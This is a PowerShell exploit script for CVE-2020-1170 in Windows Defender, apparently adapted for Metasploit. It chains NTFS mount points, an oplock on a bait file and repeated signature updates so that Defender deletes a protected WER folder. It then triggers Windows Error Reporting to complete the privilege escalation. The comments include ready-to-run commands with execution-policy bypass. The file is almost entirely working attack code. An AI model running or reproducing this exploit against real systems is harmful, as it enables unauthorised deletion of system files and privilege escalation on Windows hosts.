# Taken from https://github.com/itm4n/CVEs/blob/master/CVE-2020-1170/DefenderArbitraryFileDelete.ps1 with minor modifications made where needed for Metasploit.
# All credits go to @itm4n for this PowerShell script!

# Testing
# powershell -ep bypass -c ". .\DefenderArbitraryFileDelete.ps1; DoMain -TargetFolder 'C:\ZZ_SANDBOX\WER'"
# Real
# powershell -ep bypass -c ". .\DefenderArbitraryFileDelete.ps1; DoMain -TargetFolder 'C:\ProgramData\Microsoft\Windows\WER'

$JobCode = {
    function DoMpCmdRunLogFileWriteTriggerJob {

        [CmdletBinding()] param()

        for ($i=0; $i -lt 15000; $i++) {
            Update-MpSignature -UpdateSource InternalDefinitionUpdateServer
        }
    }
}

$symbolicLinkObject = $null

function DoMain {

    [CmdletBinding()] param(
        [Parameter(Mandatory=$True)][string] $TargetFolder,
        [Parameter(Mandatory=$True)][string] $NtApiDLLPath,
        [Parameter(Mandatory=$True)][string] $BaitFileName,
        [Parameter(Mandatory=$True)][string] $SubFolderName
    )

    $TimeoutInMinutes = 90
    $StartDate = Get-Date
    $Success = $False

    $TargetFolderPath = Resolve-Path -Path $TargetFolder -ErrorAction Stop

    if (-not [System.IO.Directory]::Exists($TargetFolderPath)) {
        return
    }

    ### Load NtApiDotNet
    Import-Module "$NtApiDLLPath" -ErrorAction "Stop"

    ### Prepare workspace
    # Create workspace directory
    $WorkspaceFolderPath = Join-Path -Path $env:TEMP -ChildPath $([Guid]::NewGuid())
    $Null = New-Item -Path $WorkspaceFolderPath -ItemType Directory

    # Fake target folder
    $TargetFolderName = Split-Path -Path $TargetFolderPath -Leaf
    $TargetFolderParent = Split-Path -Path $TargetFolderPath -Parent
    $FakeTargetFolderPath = Join-Path -Path $WorkspaceFolderPath -ChildPath $TargetFolderName
    $Null = New-Item -Path $FakeTargetFolderPath -ItemType Directory

    # Fake directory structure
    Get-ChildItem -Path $TargetFolderPath -ErrorAction Stop | ForEach-Object {
        $Path = Join-Path -Path $FakeTargetFolderPath -ChildPath $_.Name
        if ([System.IO.Directory]::Exists($_.FullName)) {
            $Null = New-Item -Path $Path -ItemType Directory
        } else {
            $Null = New-Item -Path $Path -ItemType File
        }
    }

    ### Prepare bait file
    $BaitFolderPath = Join-Path -Path $WorkspaceFolderPath -ChildPath "0000"
    $Null = New-Item -Path $BaitFolderPath -ItemType Directory
    $BaitFilePath = Join-Path -Path $BaitFolderPath -ChildPath "$BaitFileName"
    $Null = New-Item -Path $BaitFilePath -ItemType File

    ### Create fake MpCmdRun.log.bak as a mountpoint to our workspace
    # Create folder
    $MpCmdRunBakFolderPath = Join-Path -Path $([System.Environment]::GetEnvironmentVariable('TEMP','Machine')) -ChildPath "MpCmdRun.log.bak"
    $Null = New-Item -Path $MpCmdRunBakFolderPath -ItemType Directory -ErrorAction SilentlyContinue -ErrorVariable $ErrorNewItem
    if (-not $ErrorNewItem) {

        $MpCmdRunBakFolderPath = Join-Path -Path $MpCmdRunBakFolderPath -ChildPath $SubFolderName
        $Null = New-Item -Path $MpCmdRunBakFolderPath -ItemType Directory -ErrorAction SilentlyContinue -ErrorVariable $ErrorNewItem
        if (-not $ErrorNewItem) {
            ### Set MpCmdRun.log.bak folder as a mountpoint to our fake folder
            [NtApiDotNet.NtFile]::CreateMountPoint("\??\$MpCmdRunBakFolderPath", "\??\$WorkspaceFolderPath", $null)

            ### Set oplock on bait file
            $BaitNtFile = [NtApiDotNet.NtFile]::Open("\??\$BaitFilePath", $null, [NtApiDotNet.FileAccessRights]::ReadAttributes, [NtApiDotNet.FileShareMode]::All, [NtApiDotNet.FileOpenOptions]::None)
            $BaitOpLockTask = $BaitNtFile.OplockExclusiveAsync()

            ### Start MpCmdRun.log file write trigger
            $LogFileWriteJob = Start-Job -InitializationScript $JobCode -ScriptBlock { DoMpCmdRunLogFileWriteTriggerJob }

            ### Monitor OpLock in a loop until success or timeout
            # If oplock triggered, switch mountpoint
            While ($True) {

                # Timeout?
                $CurrentDate = Get-Date
                $TimeSpan = New-TimeSpan -Start $StartDate -End $CurrentDate
                $TimeRemaining = [Math]::Floor($TimeoutInMinutes - $TimeSpan.TotalMinutes)
                if ($TimeSpan.TotalMinutes -gt $TimeoutInMinutes) {
                    break
                }

                # Check OpLock
                if ($BaitOpLockTask.IsCompleted) {

                    # Once the oplock is hit, immediately stop all jobs...we don't need to do any more writing.
                    if ($LogFileWriteJob) {
                        Stop-Job -Job $LogFileWriteJob
                    }

                    [NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$MpCmdRunBakFolderPath") | Out-Null
                    [NtApiDotNet.NtFile]::CreateMountPoint("\??\$MpCmdRunBakFolderPath", "\??\$TargetFolderParent", $null)

                    $BaitNtFile.AcknowledgeOplock([NtApiDotNet.OplockAcknowledgeLevel]::No2)

                    Start-Sleep -Seconds 2
                    if (-not (Test-Path -Path $TargetFolderPath)) {
                        $Success = $True
                    }
                    break
                }

                Start-Sleep -Seconds 5
            }

            if ($BaitNtFile) {
                $BaitNtFile.Close()
            }
        } else {
            Write-Host "[-] Failed to create directory '$($MpCmdRunBakFolderPath)'" -ForegroundColor Red
        }
    } else {
        Write-Host "[-] Failed to create directory '$($MpCmdRunBakFolderPath)'" -ForegroundColor Red
    }

    if ($Success) {
        $ElapsedTime = New-TimeSpan -Start $StartDate -End $(Get-Date)
        #
        # Calls to WER based on the Add-Type Win32 API calling method described at
        # https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1/
        #
        # Type definitions taken in part from MSDN documentation as well as from
        # http://www.pinvoke.net/default.aspx/wer.WerReportSubmit and http://www.pinvoke.net/default.aspx/wer.WerReportCreate
        #
        $MethodDefinition = @'
        public enum WER_REPORT_TYPE
         {
         WerReportNonCritical,
         WerReportCritical,
         WerReportApplicationCrash,
         WerReportApplicationHange,
         WerReportKernel,
         WerReportInvalid
         }
        public enum WER_CONSENT
         {
         WerConsentAlwaysPrompt = 4,
         WerConsentApproved = 2,
         WerConsentDenied = 3,
         WerConsentMax = 5,
         WerConsentNotAsked = 1
         }
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportCreate(string pwzEventType, WER_REPORT_TYPE repType, IntPtr pReportInformation, ref IntPtr phReportHandle);
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportSubmit(IntPtr hReportHandle, int consent, int dwFlags, ref IntPtr pSubmitResult);
'@

        Add-Type -MemberDefinition $MethodDefinition -Name 'WER' -Namespace 'Win32' -PassThru
        $handle = 0 # Need to create the variable for the ref, so lets add this in so long.
        if( ([Win32.WER]::WerReportCreate("A",[Win32.WER+WER_REPORT_TYPE]::WerReportNonCritical, 0, [ref] $handle)) -ne 0 ){ # 0 in third argument is for blank pReportInformation
            Write-Host "[-] Exploit failed. Couldn't create the report" -ForegroundColor Red
        }
        $result = 999 # Need to create the variable for the ref, so set it to a random value of 999.
        if( [Win32.WER]::WerReportSubmit($handle, 1, 36, [ref]$result) -ne 0){ # 1 = WerConsentNotAsked, 36 = WER_SUBMIT_QUEUE | WER_SUBMIT_OUTOFPROCESS | WER_SUBMIT_ARCHIVE_PARAMETERS_ONLY
            Write-Host "[-] Exploit failed. Couldn't submit the report" -ForegroundColor Red
        }

        if ($result -ne 1){
            Write-Host "[-] Exploit failed. Report wasn't queued" -ForegroundColor Red
        }

        Write-Host "[+] Exploit successful! Elapsed time: $($ElapsedTime.ToString())." -ForegroundColor Green
    } else {
        Write-Host "[-] Exploit failed." -ForegroundColor Red
    }

    ### Cleanup
    Start-Sleep -Seconds 2
    if ([System.IO.Directory]::Exists($WorkspaceFolderPath)) {
        Remove-Item -Path $WorkspaceFolderPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    if ([System.IO.Directory]::Exists($MpCmdRunBakFolderPath)) {
        Remove-Item -Path $MpCmdRunBakFolderPath -Recurse -Force -ErrorAction SilentlyContinue
    }
}